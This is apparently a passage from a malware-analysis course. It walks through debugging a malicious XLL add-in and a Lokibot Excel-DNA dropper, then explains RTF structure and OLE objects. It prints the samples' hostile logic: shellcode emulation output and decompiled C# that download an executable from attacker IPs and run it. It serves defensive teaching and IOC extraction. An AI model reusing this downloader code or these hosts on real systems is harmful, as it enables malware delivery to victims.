**Note:** Let's navigate to the bottom of this section and click on ' `Click here to spawn the target system!`'. Then, let's RDP into the target IP using the provided credentials. The vast majority of the actions/commands covered from this point up to the end of this section can be replicated inside the target, offering a more comprehensive grasp of the topics presented.

Within the target (VM), you can locate the malicious samples and tools at the following paths:

- **XLL Sample**: `C:\Tools\MalDoc\Office\Demo\Samples\Excel\xll\ACW-701-M-074 071.xls.xll`
- **PE-Bear**: `C:\Tools\PE-bear\PE-bear.exe`
- **x64dbg**: `C:\Tools\x64dbg\release\x64\x64dbg.exe`
- **speakeasy**: `speakeasy` is another shellcode debugger. This is added in environment variables. Simply type `speakeasy` in command prompt and provide the shellcode file path.

* * *

**Warning:** This malicious sample should be executed only in the isolated target (VM); avoid running them on any personal or unsecured systems to prevent accidental infection.

We are going to debug this malicious DLL file in [x64dbg](https://x64dbg.com/) debugger. Since this is ctually a DLL file, we need to run `rundll32` in x64dbg to load this DLL into memory. Before we dive into debugging, we need to change the Preferences settings in x64dbg as shown below. When the 'user DLL entry' setting is enabled in the Preferences, a breakpoint is hit whenever a DLL is loaded into the process memory space. Since our goal is to debug the malicious DLL, we need to break the execution when it is loaded.

![xll](XkMaolrOtXXc.png)

Open `rundll32` in `x64dbg` debugger.

![xll](EVGyQp6AMxx7.png)

Now we need to change the commmand line to point to the XLL file and the `xlAutoOpen` function. First, we'll make a copy of the XLL file and rename it to DLL. For this exercise, we have made a copy of this XLL file into `C:\Tools\MalDoc\Office\Demo\Samples\Excel\xll\infected.dll`

Use the command line options as shown below:

```cmd-session
"C:\Windows\System32\rundll32.exe" C:\Tools\MalDoc\Office\Demo\Samples\Excel\xll\infected.dll, xlAutoOpen

```

![xll](1oD20G6yglnj.png)

After adding the command line, click the `OK` button to confirm and save these settings. Then, click the `Restart` button for the changes to take effect. This restart of x64dbg is sometimes required to apply the new command-line settings.

![xll](dVdVnxp5ZNlK.png)

Once the program is executed, we'll break the execution when the entry point of `rundll32` is reached. We'll hit the `Run` arrow one time, which will break the execution again. This time, it is because `infected.dll` (the renamed XLL file) is being loaded into memory. This can be seen at the bottom of the debugger.

![xll](rl24w415uyHe.png)

Now go to the 'Symbols' tab. As shown in the screenshot below, we can see our `infected.dll` listed in the Symbols menu. Click on the `infected.dll` module name in the left pane, and you will see Export and Import information in the right pane. Now, toggle a breakpoint on the `xlAutoOpen` function by pressing `F2` (or right-click on `xlAutoOpen` and select 'Toggle Breakpoint'). This will highlight the function name in red. Go back to the CPU tab, hit the run arrow again, and you will end up inside the exported function `xlAutoOpen`.

![xll](s35NKyokPuxW.png)

The image below shows the entry point of the `xlAutoOpen` function in the `infected.dll` module.

![xll](gjyl8wmN2d0D.png)

To view the code inside the `xlAutoOpen` function, we'll press "Step into" arrow to go inside it.

![xll](ZSkxPq4H7Fe7.png)

Once we get inside this function, we can see that the control flow is obfuscated using junk `jmp` instructions, as shown in the screenshot below.

![xll](Gr2BaWw6Y19r.png)

As we can see, there is an XOR instruction in the above screenshot.

`xor qword ptr ds:[r14], r9`

This operation XORs the 64-bit value at the memory location pointed to by `r14` with the value in `r9`. XOR is a common operation in decryption routines because applying XOR twice with the same key will return the original value.

## XOR Decryption

If we scroll down a bit, we can see the instruction `add r14, E8`.

![xll](ERSCf7t2YHtZ.png)

This adds the value E8 to the r14 register, likely setting up an offset or pointer in memory. This is an important instruction. We can add a breakpoint here by pressing F2 on this instruction. Click the Run button, and it will hit this breakpoint. Next, click the 'Step Into' button to execute this instruction.

If we check `R14` now in the registers view in the top right, we can see the new location ending with `1543`, as shown in the screenshot below.

![xll](SqUOsbmVyk7A.png)

Let's follow this in the dump. To do that, right-click on this value and select "Follow in Dump".

![xll](M0tiwy8hl9a9.png)

On the bottom left, we should be able to see this encrypted data in Dump 1.

![xll](ImUqgjFF0WlC.png)

It looks like this malware has stored the encrypted data that is being decoded at runtime. If we keep pressing the 'Step Into' button, it starts to decrypt some data one by one. As shown in the screenshot below, some part of the data is decrypted. For example, we can see part of some of the initial encrypted data changing into the readable text `kernel32`.

![xll](quBwN5ckQhvL.png)

This is a decryption loop that decrypts data byte by byte (or rather, 8 bytes at a time since it's working with qword). It can indeed take a significant amount of time to run to completion, especially if the encrypted section is large.

## Decryption Loop

A common technique used in malicious software is to conceal the true purpose of the code by encrypting its critical parts. The `decryption loop repeatedly applies a decryption algorithm to encrypted data`, effectively `transforming it back into its original, readable form`.

Malicious actors often encrypt sections of their code to prevent detection by antivirus software or to make reverse engineering more difficult. Encrypted code appears as random or meaningless data until it is decrypted at runtime.

A decryption loop typically involves several key components:

- `Initialization`: The loop starts by setting up necessary registers and pointers, often pointing to the start of the encrypted data and defining the length of the data to be decrypted.
- `Decryption Algorithm`: Within the loop, a simple or complex algorithm (e.g., XOR, addition, multiplication) is applied to transform the encrypted data back into its original form.
- `Pointer Increment`: After decrypting a portion of the data, the loop increments a pointer to move to the next portion of data to be decrypted.
- `Termination Condition`: The loop continues until a certain condition is met, usually when the pointer reaches the end of the encrypted data.

In this scenario, after doing some cleanup by removing all unnecessary JMP instructions, we can identify the instructions that are being called repeatedly, forming the decryption loop.

```nasm
  decode:
  	imul r9,r9,5AEBDF2F
  	add r9, 1F3F7ED
  	xor qword ptr ds:[r14], r9
  	add r14, 8
  	cmp r14, rax
  	jb decode

```

In this loop, these instructions perform the decryption by first pointing to the current position in the encrypted data, decrypting 8 bytes at a time, incrementing the pointer, and continuing the loop until `r14` reaches `rax`, indicating that all the data has been decrypted.

- `imul r9, r9, 5AEBDF2F`: This instruction multiplies the value in `r9` by the constant `5AEBDF2F`. The result is stored back in `r9`.

- `add r9, 1F3F7ED`: This adds the constant `1F3F7ED` to the result in `r9`.

- `xor qword ptr ds:[r14], r9`: This performs an `XOR` operation between the value at memory location \[r14\] and the value in `r9`, effectively decrypting the data at \[r14\].

- `add r14, 8`: This increments the pointer `r14` by 8 bytes (since it's working with **qword** (8-byte) data).

- `cmp r14, rax`: This compares the current pointer `r14` with `rax`, which likely holds the end address of the encrypted data.

- `jb decode`: If `r14` is still less than `rax`, the loop jumps back to the decode label, continuing the decryption process.


The GIF below provides an overview of the decryption loop used in this sample:

![xll](OQPZkpq79kw1.gif)

Decryption loops can take time to execute, especially if the encrypted section is large. This can slow down dynamic analysis and debugging. If the loop is time-consuming, we need to find a way to skip it or exit early for faster analysis.

## Loop Exit

In x64dbg, you can let the loop run to completion without stepping through each iteration manually. You can `set a breakpoint right after the loop` and let the execution run until it hits the breakpoint. This approach is the most straightforward, but you have to wait for the loop to complete. Once it is completed, the decrypted data is visible in the dump.

In this particular instance, we employed a strategic approach by inserting a breakpoint immediately following the decryption loop instructions. These instructions are visually indicated by the jump arrows displayed on the left side of the interface.

After clicking the 'Step Into' button a few times, we can see there's a call to a function that is shown after the loop. We added a breakpoint on this call instruction right after the decryption loop.

![xll](oQlhYuVW4etm.png)

After adding the breakpoint, we can press the Run arrow to come directly to this breakpoint after the loop. This will exit the loop, and the current instruction pointer will be out of the loop. Once you exit the loop, analyze the memory region where the decrypted data was written. The decrypted data should now be visible and will provide further insights into the behavior of the XLL file.

![xll](NfJNfi9EuZsS.png)

As we can see in the dump, the data looks readable now. The sequence "48 81 EC" at the beginning indicates that this may be shellcode. We need to debug this shellcode to get further information. We can dump this into a file and debug it with [speakeasy](https://github.com/mandiant/speakeasy).

To dump this into a file, select all the bytes until the end, right-click on the dump, and click `Binary > Save` to a file. Then choose the location to save and give a name to the file.

![xll](FwFMADp9HuCP.png)

## Shellcode Analysis

To perform a quick analysis of the shellcode without further debugging, we can simply launch [speakeasy](https://github.com/mandiant/speakeasy), which is developed by Mandiant.

This can be executed using the command below:

```cmd-session
C:\> speakeasy -t "C:\temp\xll\dump\dump.bin" -r -a x64

* exec: shellcode

0x108a: 'kernel32.GetProcAddress(0x77000000, "ExpandEnvironmentStringsW")' -> 0xfeee0000
0x10c8: 'kernel32.ExpandEnvironmentStringsW("%APPDATA%\\joludn.exe", "%APPDATA%\\joludn.exe", 0x104)' -> 0x14
0x10df: 'kernel32.LoadLibraryW("UrlMon")' -> 0x54500000
0x10fd: 'kernel32.GetProcAddress(0x54500000, "URLDownloadToFileW")' -> 0xfeee0001
0x117d: 'urlmon.URLDownloadToFileW(0x0, "http://141.95.107.91/cgi/dl/{REDACTED}.exe", "%APPDATA%\\joludn.exe", 0x0, 0x0)' -> 0x0
0x1194: 'kernel32.LoadLibraryW("msvcrt")' -> 0x77f10000
0x11a8: 'kernel32.GetProcAddress(0x77f10000, "_wsystem")' -> 0xfeee0002
0xfeee0002: shellcode: Caught error: unsupported_api
Invalid memory read (UC_ERR_READ_UNMAPPED)
Unsupported API: msvcrt._wsystem (ret: 0x11af)

* Finished emulating

```

As we can see, there's a call to [URLDownloadToFileW](https://learn.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/ms775123(v=vs.85)), which downloads bits from the Internet and saves them to a file.

![xll](bit3zVCGPiUh.png)

The IOCs in our case are the IP address and the malicious file hosted at `"http[:]//141[.]95[.]107[.]91/cgi/dl/REDACTED[.]exe"`

VirusTotal shows that many suspicious files communicate with this IP address.

![](Gdyh4W275IKl.png)

Continuing with the analysis in x64dbg, we can observe the same behavior noted with the Speakeasy shellcode emulator. The malware begins by accessing the Process Environment Block (PEB) and parsing the `InLoadOrderModuleList` structure. Through this list, it locates the address (HMODULE) of `kernel32.dll`. This technique is commonly used by shellcode authors to retrieve the module handle of a specific DLL without directly calling APIs such as [LoadLibrary](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya) or [GetModuleHandle](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea).

This approach avoids reliance on standard library calls, reducing the likelihood of detection by security tools that monitor for suspicious API usage. The malware specifically targets `kernel32.dll`, utilizing a previously decoded "kernel32.dll" string to search for the module handle in memory. For a high-level implementation of this technique, refer to this [example](https://gist.github.com/hasherezade/9cc711d2d8f0fdec7b4b7f5c9ece7681).

![xll](b6stX80WnBip.png)

Above code is shown below with some explanation:

```assembly
mov r9,qword ptr gs:[60]                   ;Fetch PEB
mov r9,qword ptr ds:[r9+18]				   ;Fetch pointer LDR
add r9,10								   ;InLoadOrderModuleList _LIST_ENTRY
mov r9,qword ptr ds:[r9] 				   ;Fetch LDR_MODULE from the linked list
mov r8,qword ptr ds:[r9+60]				   ;Fetch FullDllName member in LDR_MODULE struct
sub rsp,20
mov rdx,r8
call infected.6EA21744					   ;Function to check if FUllDllName matches decrypted data (kernel32.dll)
add rsp,20
test rax,rax							   ;If found, then set RAX to 1
je infected.6EA21723
mov rax,qword ptr ds:[r9+30]			   ;Store the handle to module (kernel32) in rax
ret

```

After obtaining the handle to `kernel32.dll`, the malware proceeds to retrieve the addresses of `LoadLibraryW` and `GetProcAddressW` by parsing the exported functions in kernel32 in a loop. The image below shows the code that performs the parsing.

![xll](MxzuOCPAroSV.png)

The address of the [ExpandEnvironmentStringsW](https://learn.microsoft.com/en-us/windows/win32/api/processenv/nf-processenv-expandenvironmentstringsw) API is resolved by calling [GetProcAddressW](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress). The API is invoked by providing the arguments as the %APPDATA% directory of the user and an executable name `joludn.exe` appended to the path.

![xll](pB0bun5jNuKD.png)

The `LoadLibraryW` is invoked again, and this time it tries to load `urlmon.dll`. It proceeds to resolve the address of the [URLDownloadToFileW](https://learn.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/ms775123(v=vs.85)) API. When the [URLDownloadToFile](https://learn.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/ms775123(v=vs.85)) is called, we can see the full %APPDATA% directory of the user (expanded using [ExpandEnvironmentStringsW](https://learn.microsoft.com/en-us/windows/win32/api/processenv/nf-processenv-expandenvironmentstringsw)), and executable name `joludn.exe` is appended to the path. The file is saved on disk as `joludn.exe`.

![xll](2EacmxAwY0xq.png)

Once this function returns, a GET request is sent to this IP address to download the file. The screenshot below is from [Fiddler](https://www.telerik.com/fiddler), which shows this request once it is made.

![xll](uFJyUr2jLjQw.png)

Finally, [LoadLibraryW](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibraryw) is invoked to load `msvcrt.dll`, and address of [\_wsystem](https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/system-wsystem?view=msvc-170) is resolved using [GetProcAddressW](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress). The downloaded file is executed by calling [\_wsystem](https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/system-wsystem?view=msvc-170). The file is not hosted or available at the time of this analysis, but we discussed how to reach this point where we can extract the IOCs from this XLL file.


# Excel-DNA C\# XLL Add-ins (Lokibot)

## Introduction

Recently, there's been a rise in malware groups using malicious [Excel Add-in](https://learn.microsoft.com/en-us/office/client-developer/excel/developing-excel-xlls) (XLL) files to compromise victim machines. These files are actually similar to DLL files, as explained earlier. These add-ins offer a powerful way to extend Excel's functionality by allowing high-performance functions to be called directly from Excel worksheets via an API. This makes them a more powerful alternative to traditional scripting interfaces like Visual Basic for Applications (VBA). However, adversaries are also leveraging these same capabilities to achieve malicious objectives.

The screenshot below shows a post on underground forums from one threat actor who claimed to be selling a builder that creates XLL droppers.

![XLL-DNA](Bq2iU5MmnZuw.png)

> **Image Source**: ( [HP Threat Research](https://threatresearch.ext.hp.com/how-attackers-use-xll-malware-to-infect-systems/)) How Attackers Use XLL Malware to Infect Systems

In the previous section, we understood the identification and analysis of such files. But in this section, we'll learn something new. Typically, these files are written in native code such as C or C++ and loaded directly by Excel. However, there is also a way for developers to write XLL Add-Ins using managed languages like C#. This approach combines the performance benefits of XLLs with the flexibility and ease of .NET programming. This can be achieved using [Excel DNA](https://excel-dna.net/).

`Excel DNA` is a popular open-source library that allows developers to create high-performance Excel Add-Ins using .NET languages like C#. These Add-Ins, known as XLL Add-Ins, integrate seamlessly with Excel, offering the ability to create custom functions, automate tasks, and extend Excel's capabilities in powerful ways. The most common type of `malicious XLL samples observed in the wild are generated using Excel-DNA`.

![XLL-DNA](qfrXeNB5rpSh.png)

## How Excel DNA Works?

Excel DNA works by wrapping `.NET` code into a native XLL wrapper that Excel can load. The core components of an Excel DNA Add-In include:

- `ExcelDna.Integration`: This is the primary library that enables integration with Excel. It provides attributes and classes for creating custom Excel functions, macros, and ribbon extensions.
- `ExcelDna.AddIn`: This defines the entry point of the XLL Add-In and contains the logic for loading and managing the Add-In's functionality.
- `.dna File`: This XML-based file defines the Add-In's configuration, specifying which .NET assemblies to load, any additional references, and the Add-In’s main class.

This `.dna` XML file is very important as it will help us identify which DLL file to analyze.

## Analysis of Excel-DNA Addin files

We'll perform the analysis of a malicious XLL sample. The details related to the sample are as follows:

| Name | Description |
| --- | --- |
| File Name | MV SEAMELODY.xll |
| MD5 Hash | D599AECAA32E0B0B41F4A688F85388C6 |
| Detections | [VirusTotal](https://www.virustotal.com/gui/file/34bb23510422ca1f135e4193995908dda6f61f4ed8fb1b4e8cd377e91b203f59) |

* * *

**Note:** Let's navigate to the bottom of this section and click on ' `Click here to spawn the target system!`'. Then, let's RDP into the target IP using the provided credentials. The vast majority of the actions/commands covered from this point up to the end of this section can be replicated inside the target, offering a more comprehensive grasp of the topics presented.

Within the target (VM), you can locate the malicious samples and tools at the following paths:

- **PE-Bear**: `C:\Tools\PE-bear\PE-bear.exe`
- **exceldna-unpack**: `C:\Tools\exceldna-unpack\exceldna-unpack.exe`
- **dnSpy**: `C:\Tools\dnSpy\dnSpy.exe`
- **XLL Sample**: `C:\Tools\MalDoc\Office\Demo\Samples\xll\lokibot\MV SEAMELODY.xll`

* * *

**Warning:** This malicious sample should be executed only in the isolated target (VM); avoid running them on any personal or unsecured systems to prevent accidental infection.

The first thing we can look for is the type `DNA` in the resources upon opening this sample in PE-Bear.

![XLL-DNA](D9tuS05bgE3p.png)

We'll use an open-source project called [ExcelDna-Unpack](https://github.com/augustoproiete/exceldna-unpack), which is a command-line utility to extract the contents of Excel-DNA add-ins.

```cmd-session
C:> cd C:\Tools\MalDoc\Office\Demo\Samples\xll\lokibot

C:\Tools\MalDoc\Office\Demo\Samples\xll\lokibot> C:\Tools\exceldna-unpack\exceldna-unpack.exe --xllFile="MV SEAMELODY.xll"

```

All the packed files have been extracted. Notice the `.dna` file at the end.

![XLL-DNA](SweIrXizTDSo.png)

Let's open the DNA file in Notepad++ or another text editor.

![XLL-DNA](zWZY5lzDUHd5.png)

The `.dna` file contains information in XML format, which is the configuration for this Excel DNA Add-In. This file is used to define the structure and behavior of an Excel DNA-based add-in. The `ExternalLibrary` element in this file specifies an external library that is included as part of the add-in. Here, `Path="packed:EXCEL NEW"` indicates that the library is embedded within the add-in package under the identifier `EXCEL NEW`.

Now we need to analyze this file the `EXCEL NEW`, which is present in the unpacked directory. To verify the file type, we can use `trid` or another tool called [Detect It Easy](https://github.com/horsicq/Detect-It-Easy), which can help determine types of files.

Output from `trid` verifies that it is a .NET based DLL File.

![XLL-DNA](0CKioopXhkcZ.png)

Output from `Detect It Easy` also confirms that it is a .NET-based DLL file.

![XLL-DNA](BSbTsR76AN5O.png)

## Analysis of packed .NET DLL

Since these XLL add-ins use a .NET DLL (as indicated by the `.dna` configuration file), [dnSpy](https://github.com/dnSpy/dnSpy) is an excellent tool for analyzing them.

### Load the DLL into dnSpy

Open `dnSpy` which is located in `C:\Tools\dnSpy\dnSpy.exe`, on the Lab VM. Drag and drop the DLL file `EXCEL NEW.dll` (which is referenced in the .dna file) from the unpacked directory into dnSpy, or use the `File > Open` menu option to load the DLL.

![XLL-DNA](yjhRtjS4IlLg.png)

Once the DLL is loaded, `dnSpy` will display the structure of the assembly, including namespaces, classes, methods, and properties. You can navigate through these to understand the functionality of the code. `dnSpy` automatically decompiles the `.NET` code into `C#`, making it easier to read and understand.

We can view the decompiled code for each method by clicking on it in the left-hand pane.

Look for key functions that might be exposed to Excel via the XLL add-in. These will often be public methods that the Excel DNA framework calls.
Pay attention to any suspicious code, such as calls to external resources, file operations, or potentially harmful API functions.

![XLL-DNA](FyRwfQnC0Mm7.png)

The code is within the `excel_new.ExcelDNANS` namespace, and the primary class of interest is `ExcelDNAInt`, which implements the `IExcelAddIn` interface from `ExcelDna`.

Inside it, there is an `Auto_Open` method, which is an event handler that executes when the Excel add-in is loaded (similar to an `Auto_Open` macro in VBA). This method is where the malicious activity takes place.

The line below configures the .NET framework to use TLS 1.2 when making network connections, ensuring that the download occurs over a secure connection.

```csharp
ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

```

The code uses `WebClient` to download an executable file from a specified URL ( `hxxp[:]103[.]89[.]90[.]10/intelpro/goa[.]exe`).

```csharp
byte[] bytes = new WebClient().DownloadData("http[:]103[.]89[.]90[.]10/intelpro/goa[.]exe");

```

The downloaded file is saved to the user's Temp directory as `sse.exe`.

```csharp
File.WriteAllBytes(Environment.GetEnvironmentVariable("Temp") + "\\sse.exe", bytes);

```

The program waits for 5 seconds ( `Thread.Sleep(5000)`) and then executes the downloaded file using `Interaction.Shell`.

The executable is run in a minimized window ( `AppWinStyle.MinimizedFocus`), likely to avoid drawing attention from the user.

```csharp
Thread.Sleep(5000);
Interaction.Shell(Environment.GetEnvironmentVariable("Temp") + "\\sse.exe", AppWinStyle.MinimizedFocus, false, -1);

```

At the time of analysis, the server and hosted file were taken down. From here, we can extract the IOC, which is the IP address 103\[.\]89\[.\]90\[.\]10. The origin of this IP address is Hanoi, Vietnam. According to this [Joe Sandbox Report](https://www.joesandbox.com/analysis/555621/1/html), this executable is [Lokibot](https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-266a). In this case, the XLL file is used to deliver infostealer malware and ransomware.


# RTF Internals

## Introduction

The Rich Text Format (often abbreviated as [RTF](https://en.wikipedia.org/wiki/Rich_Text_Format)) is a proprietary document file format with a published specification developed by Microsoft Corporation from 1987 until 2008 for cross-platform document interchange with Microsoft products. The RTF file format encodes text and graphics for sharing between different applications. Unlike binary formats such as `.doc` or OOXML formats like `.docx`, RTF files are composed of plain text, control words, groups, backslashes, and delimiters. This makes RTF files highly portable and easily readable by various text editors and word processors across different platforms.

- `Text and Graphics Encoding`: Encodes text and graphics in a plain text format.
- `Cross-Platform Compatibility`: Can be opened by various applications without the need for Microsoft Office or even a Windows operating system.
- `No Macro Support`: Unlike OOXML formats, RTF files do not support macros, reducing the risk of macro-based attacks.

Despite the lack of macro support, RTF files can still be used in attacks through embedded objects (such as OLE1 objects), binary contents, or exploits targeting vulnerabilities in RTF parsers.

[WordPad](https://en.wikipedia.org/wiki/WordPad) is the default text editor that creates RTF files in Windows. However, Microsoft Word and other non-Microsoft applications, such as LibreOffice Writer, can also be used to create RTF files.

Let's understand the RTF format first using practical examples. We'll create an RTF file and add the text below to it.

![rtf-analysis](Pf7k5eWfrYz5.png)

If we open this RTF file in a plain text editor such as `Notepad`, we see the contents as shown in the screenshot below.

![rtf-analysis](pRPRcZZ6EN8d.png)

If we use the Python utility RTF Dump `rtfdump.py` to dump the contents, it also splits the contents into different levels based on the different headers.

```cmd-session
C:\> python C:\Tools\MalDoc\Office\Tools\DidierStevensSuite\rtfdump.py C:\Tools\MalDoc\Office\Demo\Samples\rtf\demo\HTB-Sample.rtf

```

![rtf-analysis](Jo2w4ZQJANdg.png)

If we change the font style to "Bold", and the font color to red for a part of the text, it will add new groups `\fonttbl` and `\colortbl`.

![rtf-analysis](OZy4G2TwTtWv.png)

## Objects

RTF objects are the linked or embedded objects within RTF documents, specifically designated by the `object` destination control word. The embedded or linked object's data is stored as a parameter under the `objdata` sub-destination control word, using the `hex-encoded OLESaveToStream` format. The "objclass" modifier control word identifies the type of embedded object in the RTF file, guiding the client application in rendering the object properly.

To understand this in a simple manner, we can add an object to this sample RTF document using WordPad, as shown in the screenshot below.

![rtf-analysis](aqboASutKeAi.png)

This new object is visible in the RTF Dump output as well (as shown below).

![rtf-analysis](XTAq3W8w5TVG.png)

In case we want to only see the objects, we can use the following command to check for the presence of any embedded OLE files.

```cmd-session
C:\> python c:\Tools\MalDoc\Office\Tools\DidierStevensSuite\rtfdump.py C:\Tools\MalDoc\Office\Demo\Samples\rtf\demo\HTB-Sample.rtf -f O

    8   Level  3      c=    0 p=0000014e l=  587815 h=  573080;      78 b=       0 O u=       0 \*\objdata
      Name: b'PBrush\x00' Size: 143200 md5: e48cba87c15ef884a08d8f56721c875f magic: 424d602f

```

In the `rdpdump.py` Python utility, the option `-f O` is used to filter and show only objects. The option `-O` is used to get an overview of all objects present. In this sample, there's only one object present.

```cmd-session
C:\> python c:\Tools\MalDoc\Office\Tools\DidierStevensSuite\rtfdump.py C:\Tools\MalDoc\Office\Demo\Samples\rtf\demo\HTB-Sample.rtf -O

1: Name: b'PBrush\x00'
   Magic: b'424d602f'
   Size: 143200
   Hash: md5 e48cba87c15ef884a08d8f56721c875f

```

## Structure of RTF file

An RTF file is divided into two main sections: the header and the document area.

- `RTF Header`: The header contains instructions for the RTF reader on how to render the file. It includes control commands that define the overall format and display settings for the document. For instance, it might specify the character set, fonts, and color settings to be used.
- `Document Area`: The document area contains the actual content of the RTF file, including both unformatted text and embedded formatting commands. The RTF reader interprets the commands from the header to format and display this content appropriately.

An RTF file is made up of the following components:

- `Unformatted text`
- `Control words`
- `Control symbols`
- `Groups`

The diagram below shows the structure and different components of the structure of an RTF file.

![rtf-analysis](F9pd9mAzzseK.png)

### Unformatted text

This is the `plain text` that will be displayed in an RTF reader, such as Microsoft Word.

### Control words and Control symbols

These are `formatting commands that instruct the RTF reader on how to manage and display the text`. Control words typically start with a `backslash` (e.g., `\b` for bold text), while control symbols are single-character commands. Let's remember these points related to them:

- A Control Word is a specially formatted command that RTF uses to mark printer control codes and information that applications use to manage documents.
- A backslash begins each control word.
- A control word cannot be longer than 32 characters.
- A control word takes the form shown below.

### Groups

Groups consist of text and control words or symbols enclosed in braces `{}`. They define sections of text that share specific formatting attributes. For example, a group might specify a bookmark or a comment within the text.

Below is an example of a simple group in an RTF file:

```rtf
{\b This text is bold.} This text is not bold.

```

This is a very simple example of a group in an RTF file. In this example:

- `{\b This text is bold.}` is a group that applies the bold formatting ( `\b`) to the text " **This text is bold.**"
- The text " `This text is not bold.`" is outside the group and is, therefore, not bold.

RTF groups can also contain other control words, symbols, and nested groups to define more complex formatting or structures within the document. More detailed information related to RTF format and its different components can be found in the RTF Specification. This specification can be found [here](https://web.archive.org/web/20180821134918/http://www.microsoft.com/en-us/download/details.aspx?id=10725).

Now, let's examine the key elements.

### RTF Header

The header has the following syntax:

```rtf
\rtf <charset> \deff? <fonttbl> <filetbl>? <colortbl>? <stylesheet>? <listtables>? <revtbl>?

```

Each of the various header tables should appear, if they exist, in the above order. Document properties can occur before and between the header tables. A property must be defined before being referenced. Specifically:

- The style sheet must occur before any style usage.
- The font table must precede any reference to a font.
- The `\deff` keyword must precede any text without an explicit reference to a font, because it specifies the font to use in such cases.

#### RTF Version

An `entire RTF file is considered a group` and must be enclosed in braces. The `\rtfN` control word must follow the opening brace. The numeric parameter `N` identifies the major version of the RTF Specification used.

#### Character Set

After the RTF version, a character set is present, which is to be used in this document. The control word for the character set must precede any plain text or any table control words. The RTF Specification currently supports the following character sets.

| Control word | Character set |
| --- | --- |
| `\ansi` | ANSI (the default) |
| `\mac` | Apple Macintosh |
| `\pc` | IBM PC code page 437 |
| `\pca` | IBM PC code page 850, used by IBM Personal System/2 |

#### Font Table

The `\fonttbl` control word introduces the font table group. Unique `\fN` control words define each font available in the document, and are used to reference that font throughout the document.

#### Color Table

The `\colortbl` control word introduces the color table group, which defines screen colors, character colors, and other color information. This group has the following syntax:

The following are valid control words for this group.

| Control word | Meaning |
| --- | --- |
| `\redN` | Red index |
| `\greenN` | Green index |
| `\blueN` | Blue index |

* * *

### Document Area

The document area starts after the header and is where you define all the text, formatting, and any document-specific settings. It typically includes:

```rtf
<document>	<info>? <docfmt>* <section>+

```

- Information Group ( `\info`): This optional section contains metadata about the document, such as the title, author, and keywords.
- Document Formatting ( `<docfmt>`): Defines specific formatting details for the document, such as margins, headers, footers, etc.
- Sections ( `<section>`): Contains the actual content of the document, such as paragraphs of text, images, tables, etc.

In an RTF file, the document area might look like the following:

```rtf
{\rtf1\ansi\deff0
    {\fonttbl{\f0 Arial;}}  ; This is part of the Header Section
    {\info                   ; This is the start of the Document Area
        {\title My Document} ; Information Group: Title
        {\author Jane Doe}   ; Information Group: Author
    }
    {\pard\plain This is the main content of the document. \par}  ; Main content of the Document Area
}

```

The `\info` control word introduces the information group, which contains information about the document. This can include the title, author, keywords, comments, and other information specific to the file.

The RTF document can contain paragraph text, which is of two kinds: plain and table. A table is a collection of paragraphs, and a table row is a continuous sequence of paragraphs partitioned into cells. The `\intbl` paragraph-formatting control word identifies the paragraph as part of a table. This control is inherited between paragraphs that do not have paragraph properties reset with `\pard`.

If the `\pard` is present, it resets to default paragraph properties. And if the `\pard` control word is not present, the current paragraph inherits all paragraph properties defined in the previous paragraph. An RTF file can also include pictures created with other applications. These pictures can be in hexadecimal (the default) or binary format. Pictures are destinations and begin with the `\pict` control word.

The most crucial aspect to focus on is the Objects.

#### Objects

Microsoft OLE links, Microsoft OLE embedded objects, and Macintosh Edition Manager subscriber objects are represented in RTF as objects. Objects are destinations that contain a data part and a result part. The data part is generally hidden from the application that produced the document. A separate application uses the data and supplies the appearance of the data. This appearance is the result part of the object.

The object definition below is commonly seen in malicious RTF files that deliver documents carrying the infamous Equation Editor exploit.

```rtf
  {
      \object
      \objemb
      \objupdate
      {\*\objclass Equation.3}
      \objw380
      \objh260
      {\*\objdata <DATA> }
   }

```

Object Linking and Embedding (OLE) enables users to drop an Excel sheet into a Word document. This is one of the easiest examples to understand OLE. At the implementation level, the user data is represented as objects. In RTF files, we can use objects to store such OLE data so that other applications that read the RTF can render this according to their specifications and standards. The concept of OLE is realized through a remarkable Microsoft technology called Component Object Model (COM).

#### Objects Types

Here are the different types of objects:

| Control word | Meaning |
| --- | --- |
| `\objemb` | An object type of OLE embedded object. If no type is given for the object, the object is assumed to be of type `\objemb`. |
| `\objlink` | An object type of OLE link. |
| `\objautlink` | An object type of OLE autolink. |
| `\objsub` | An object type of Macintosh Edition Manager subscriber. |
| `\objpub` | An object type of Macintosh Edition Manager publisher. |
| `\objicemb` | An object type of MS Word for the Macintosh Installable Command (IC) Embedder. |
| `\objhtml` |  |
| `\objocx` | An object type of OLE control. |

The `\objclass` text argument is the object class to use for this object. This is a destination control word. The `\objdata` subdestination contains the data for the object in the appropriate format. This is a destination control word.

An RTF file begins and ends with curly braces. It contains different levels for the contents, as demonstrated in the example below.

![rtf-analysis](XhIajq0tljFd.png)

The RTF Dump tool also shows the levels in this format.

![rtf-analysis](DXII4kIBnN47.png)

From the perspective of malware development and analysis, RTF files serve as delivery agents for other file types that exploit a code execution vulnerability. The reason for this is that RTF files don't have code execution capabilities; they don't support macros or any scripting languages. Thus, to execute malicious code on the target system, attackers embed vulnerable Excel and Word documents inside RTF files and ship them to the unsuspecting target. There are situations where attackers exploit a specific RTF control word to gain code execution; one such vulnerability is CVE-2023-21716, which involves font table heap corruption.

* * *

We'll now perform analysis of a Malicious RTF document in the next section. Click on `Mark Complete & Next` to proceed to the next section.


# Analysis of Malicious RTF Files

* * *

## Malicious RTF Analysis

RTF (Rich Text Format) files have the capability to embed other files within the RTF file itself. Attackers often use this to embed malware and send it to victims. The vast majority of RTF samples are known to contain embedded shellcode payloads.

We'll perform the analysis of a malicious RTF sample. The details related to the sample are as follows:

| Name | Description |
| --- | --- |
| `File Name` | payload\_1.doc |
